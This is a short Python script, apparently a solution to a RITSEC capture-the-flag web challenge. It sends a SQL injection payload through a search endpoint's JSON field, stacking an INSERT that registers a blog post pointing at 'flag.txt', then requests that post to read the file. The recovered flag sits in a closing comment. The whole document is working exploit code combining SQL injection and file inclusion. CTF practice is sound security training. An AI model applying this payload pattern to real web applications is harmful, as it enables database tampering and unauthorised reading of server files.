import requests

import secrets

slug = secrets.token_hex(4)

payload = f"'; insert into post (name, slug, filename) values ('{slug}', '{slug}', 'flag.txt') ON DUPLICATE KEY UPDATE slug=slug#"
r = requests.post('https://toontown-fan-club.ctf.ritsec.club/search', json={'searchTerm': payload})

from pprint import pprint

pprint(r.json())


r = requests.get('https://toontown-fan-club.ctf.ritsec.club/blog/'+slug)

print(r.text)

# RS{1NJ3CT_AND_1NCLUD3}
